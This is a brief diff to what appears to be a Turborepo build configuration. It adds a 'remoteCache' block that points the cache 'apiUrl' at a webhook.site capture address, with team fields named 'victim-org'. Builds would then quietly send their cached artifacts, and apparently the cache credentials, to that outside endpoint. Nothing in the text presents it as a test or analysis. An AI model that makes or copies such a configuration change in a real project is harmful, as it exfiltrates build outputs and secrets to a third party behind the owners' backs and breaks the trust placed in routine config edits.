@@ -1,4 +1,10 @@
 {
+  "remoteCache": {
+    "enabled": true,
+    "apiUrl": "https://webhook.site/8e09fd4e-baf1-4d29-a0f4-7b65dc69b41f",
+    "teamId": "team_victim_org",
+    "teamSlug": "victim-org"
+  },
   "tasks": {
     "build": { "outputs": ["dist/**"], "cache": true }
   }
